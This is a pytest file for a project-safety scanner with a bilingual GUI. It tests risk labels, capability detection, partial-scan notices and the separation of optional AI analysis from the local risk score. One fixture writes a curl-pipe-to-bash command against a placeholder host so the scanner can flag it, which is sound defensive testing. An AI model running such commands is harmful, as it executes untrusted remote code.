from pathlib import Path

import pytest

pytest.importorskip("PySide6")

from safeinstall.core import scan_target
from safeinstall.gui.i18n import Catalog
from safeinstall.gui.presentation import present_report
from safeinstall.gui.result_view import ResultView
from safeinstall.models import AIAnalysisResult, Capability, Severity


def _example(name: str) -> Path:
    return Path(__file__).parents[2] / "examples" / name


def test_info_engine_result_is_presented_as_low_without_mutating_report() -> None:
    report = scan_target(_example("safe-project"))

    result = present_report(report, Catalog("en"))

    assert report.risk.level is Severity.INFO
    assert result.risk_level is Severity.LOW
    assert result.risk_label == "LOW · Low risk"
    assert result.files_scanned == 2
    assert not any(item.observed for item in result.capabilities)


def test_risky_project_presents_evidence_backed_capabilities_and_top_findings() -> None:
    report = scan_target(_example("risky-project"))

    result = present_report(report, Catalog("en"))

    assert result.risk_level is Severity.CRITICAL
    assert {item.capability for item in result.capabilities if item.observed} == {
        Capability.SHELL_EXECUTION,
        Capability.NETWORK_ACCESS,
        Capability.ENVIRONMENT_READ,
    }
    assert result.top_findings[0].rule_id == "SI-PY-001"
    assert result.top_findings[0].location == "capabilities.py:13"
    assert "does not prove" in result.why.lower()


def test_capabilities_are_translated_for_simplified_chinese() -> None:
    report = scan_target(_example("risky-project"))

    result = present_report(report, Catalog("zh_CN"))

    shell = next(
        item for item in result.capabilities if item.capability is Capability.SHELL_EXECUTION
    )
    assert shell.label == "执行系统命令"
    assert shell.value == "是"
    assert result.risk_label == "CRITICAL · 严重风险"
    assert all("HIGH" not in finding.severity_label for finding in result.top_findings)


def test_optional_ai_result_is_visible_and_kept_separate_from_local_risk() -> None:
    report = scan_target(_example("risky-project"))
    report = report.model_copy(
        update={
            "ai_analysis": AIAnalysisResult(
                model="test-model",
                summary="Optional explanation fixture.",
                top_risks=("Review shell input.",),
                review_notes=("Target text remained untrusted data.",),
                sent_findings=3,
                sent_prompt_files=1,
            )
        }
    )

    result = present_report(report, Catalog("en"))

    assert result.ai is not None
    assert result.ai.summary == "Optional explanation fixture."
    assert result.ai.sent_context == "Sent context: 3 redacted findings and 1 prompt file."
    assert result.risk_level is report.risk.level


def test_optional_ai_result_is_visible_on_result_page(qtbot: object) -> None:
    report = scan_target(_example("safe-project")).model_copy(
        update={
            "ai_analysis": AIAnalysisResult(
                model="test-model",
                summary="Visible optional explanation.",
                top_risks=(),
                review_notes=(),
                sent_findings=1,
                sent_prompt_files=0,
            )
        }
    )
    view = ResultView(Catalog("en"))
    qtbot.addWidget(view)  # type: ignore[attr-defined]

    view.set_report(report)

    assert not view.ai_panel.isHidden()
    assert view.ai_summary.text() == "Visible optional explanation."
    assert "cannot change" in view.ai_advisory.text()


def test_all_builtin_categories_have_english_and_chinese_user_labels() -> None:
    from safeinstall.gui.presentation import BUILTIN_FINDING_CATEGORIES

    english = Catalog("en")
    chinese = Catalog("zh_CN")
    for category in BUILTIN_FINDING_CATEGORIES:
        key = f"category.{category}"
        assert english.has(key), category
        assert chinese.has(key), category
        assert chinese.text(key) != english.text(key), category


@pytest.mark.parametrize("locale, label", [("en", "Scan incomplete"), ("zh_CN", "扫描不完整")])
def test_partial_scan_does_not_show_a_green_low_risk_verdict(
    tmp_path: Path, qtbot: object, locale: str, label: str
) -> None:
    (tmp_path / "ok.py").write_text("# fixture\n", encoding="utf-8")
    (tmp_path / "broken.sh").write_bytes(b"\x81fixture")
    report = scan_target(tmp_path)
    view = ResultView(Catalog(locale))
    qtbot.addWidget(view)  # type: ignore[attr-defined]

    view.set_report(report)

    assert report.risk.level is Severity.INFO
    assert view.risk_label.text() == label
    assert view.risk_card.property("risk") == "incomplete"
    assert not view.coverage_notice.isHidden()
    assert "broken.sh" in view.coverage_notice.text()
    assert "UTF-8" in view.coverage_notice.text()
    assert not view.checks.text()
    assert all(item.value not in {"NO", "否"} for item in view.presentation.capabilities)

    view.set_report(scan_target(_example("safe-project")))
    assert view.coverage_notice.isHidden()
    assert view.risk_card.property("risk") == "low"


def test_partial_scan_preserves_high_risk_evidence(tmp_path: Path) -> None:
    (tmp_path / "install.sh").write_text(
        "curl https://example.invalid/install.sh | bash\n", encoding="utf-8"
    )
    (tmp_path / "broken.py").write_bytes(b"\x81fixture")

    result = present_report(scan_target(tmp_path), Catalog("zh_CN"))

    assert result.risk_level is Severity.HIGH
    assert "扫描不完整" in result.risk_label
    assert "高风险" in result.risk_label
    assert result.top_findings
